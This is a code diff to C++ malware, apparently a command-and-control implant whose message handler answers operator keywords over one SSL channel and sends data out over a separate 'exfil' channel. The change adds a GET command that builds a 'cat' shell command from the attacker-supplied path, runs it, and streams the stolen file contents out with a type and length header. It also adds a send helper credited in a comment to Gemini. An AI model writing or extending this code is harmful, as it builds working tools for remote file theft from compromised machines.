@@ -3,6 +3,7 @@
 #include <cstdlib>
 #include <cstddef>
 #include <cstdio>
+#include <cstring>
 #include <iostream>
 #include <sstream>
 #include <string>
@@ -58,6 +59,27 @@ std::string exec(const char* cmd) {
     return r;
 }
 
+/* Made by Gemini */
+bool send_all_ssl(SSL* ssl, const char* data, int total_size) {
+    int bytes_sent = 0;
+    while (bytes_sent < total_size) {
+        // Try to send the remaining slice of the buffer
+        int result = SSL_write(ssl, data + bytes_sent, total_size - bytes_sent);
+        
+        if (result <= 0) {
+            int err = SSL_get_error(ssl, result);
+            // Handle cases where the socket isn't ready or was closed
+            if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ) {
+                continue; // Retry if it's a temporary block
+            }
+            // Real error occurred
+            return false;
+        }
+        bytes_sent += result;
+    }
+    return true;
+}
+
 void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
     std::istringstream iss(msg);
     std::string keyword, id, data;
@@ -67,6 +89,7 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
 
     std::string c2_response;
     std::string exfil_data;
+    char type = 'T';
 
     if (keyword == "HELO") {
         c2_response = "HELLO " + id;
@@ -142,14 +165,23 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
             SSL_write(c2_ssl, c2_response.c_str(), c2_response.size());
         }
         self_destruct();
+    } else if (keyword == "GET") {
+        type = 'F';
+        std::string full_cmd = "cat " + data;
+        exfil_data = exec(full_cmd.c_str());
     } else {
         c2_response = "ERR " + id;
     }
-
+    
     if (exfil_ssl && !exfil_data.empty() && keyword != "SELF_DESTRUCT") {
-        SSL_write(exfil_ssl, exfil_data.c_str(), exfil_data.size());
+        uint32_t payload_size = htonl(static_cast<uint32_t>(exfil_data.size()));
+        char* size_bytes = reinterpret_cast<char*>(&payload_size);
+
+        std::string s = std::string(1, type) + std::string("0000") + exfil_data;
+        memcpy(&s[1], size_bytes, 4);
+
+        SSL_write(exfil_ssl, s.c_str(), s.size());
     }
-    // SSL_write(c2_ssl, c2_response.c_str(), c2_response.size());
 }
 
 SSL_CTX* createSSLContext() {
